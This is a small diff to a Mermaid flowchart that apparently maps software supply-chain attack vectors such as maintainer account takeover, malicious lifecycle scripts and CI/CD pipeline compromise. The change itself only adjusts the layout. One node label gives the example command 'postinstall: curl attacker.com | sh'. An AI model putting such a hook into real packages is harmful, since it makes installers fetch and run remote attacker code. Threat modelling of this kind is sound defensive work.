@@ -14,6 +14,7 @@ flowchart TD
         Takeover["3. Account / Maintainer Takeover<br/>(Compromised developer credentials / phishing)"]
         MalScript["4. Malicious Lifecycle Scripts<br/>(postinstall: curl attacker.com | sh)"]
         BuildComp["5. CI/CD Build Pipeline Compromise<br/>(Poisoned GitHub Actions / runner tampering)"]
+        Typo ~~~ DepConf ~~~ Takeover ~~~ MalScript ~~~ BuildComp
     end
 ```
 
